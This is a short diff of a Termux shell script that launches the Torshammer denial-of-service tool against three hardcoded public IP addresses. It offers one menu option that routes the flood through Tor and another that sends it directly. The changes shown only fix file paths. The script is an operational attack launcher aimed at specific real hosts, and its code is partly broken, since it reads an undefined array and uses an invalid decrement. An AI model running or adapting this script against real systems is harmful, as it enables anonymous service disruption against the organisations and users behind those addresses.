@@ -4,7 +4,7 @@ termux-wake-lock
 
 declare -a IP=("14.139.187.132" "117.240.224.6" "103.5.112.83")
 
-sh ~amrita/update_saphira.sh;
+sh ~/amrita/update_saphira.sh;
 
 clear;
 
@@ -32,7 +32,7 @@ read -p 'Choose 1/2/3/0 : ' var;
 #This is to run setup_saphira.sh
 if [ $var -eq 3 ]
 then
-	sh setup_saphira.sh
+	sh ~/amrita/setup_saphira.sh
 fi
 
 #This is to connect to Tor circuit
@@ -47,7 +47,7 @@ then
 	echo "Choose IP. Valid Choice btw 1 & 3"
 	read n
 	n--
-	python2  ~/torshammer/torshammer.py -t ${arr[n]} -r 5000 -T
+	python2  ~/amrita/torshammer/torshammer.py -t ${arr[n]} -r 5000 -T
 fi
 
 #This is to run Torshammer without Tor
@@ -56,7 +56,7 @@ then
 	echo "Choose IP. Valid Choice btw 1 & 3"
 	read n
 	n--
-	python2  ~/torshammer/torshammer.py -t ${arr[n]} -r 5000
+	python2  ~/amrita/torshammer/torshammer.py -t ${arr[n]} -r 5000
 fi
 
 tput sgr0;
